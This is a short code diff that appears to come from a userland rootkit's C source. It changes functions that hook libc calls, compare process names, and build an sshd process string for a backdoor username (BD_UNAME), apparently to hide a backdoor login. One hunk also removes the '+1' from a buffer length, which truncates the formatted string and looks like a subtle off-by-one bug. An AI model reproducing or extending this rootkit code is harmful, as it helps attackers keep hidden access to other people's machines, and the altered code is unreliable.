@@ -15,7 +15,8 @@ int open_cmdline(pid_t pid){
     snprintf(path, sizeof(path), CMDLINE_PATH, pid);
     hook(COPEN);
     fd = (long)call(COPEN, path, 0, 0);
-    memset(path, 0, strlen(path));
+    memset(path, 0, strlen(path));   /* clear path after */
+                                     /* getting its fd.  */
 
     return fd;
 }
@@ -62,7 +63,7 @@ end_processinfo:
  * name of the current process' name. */
 int cmp_process(char *name){
     char *myname = process_name();
-    int status = strncmp(myname, name, strlen(name));
+    int status = strncmp(myname, name, strlen(myname));
     free(myname);
     return !status;
 }
@@ -84,7 +85,7 @@ int process(char *name){
 int bd_sshproc(void){
     int status = 0,
         sshds_len = strlen(SSHD_PROC_STR) + 
-                    strlen(BD_UNAME) + 1;
+                    strlen(BD_UNAME);
     char sshds[sshds_len];
 
     snprintf(sshds, sshds_len, SSHD_PROC_STR, BD_UNAME);
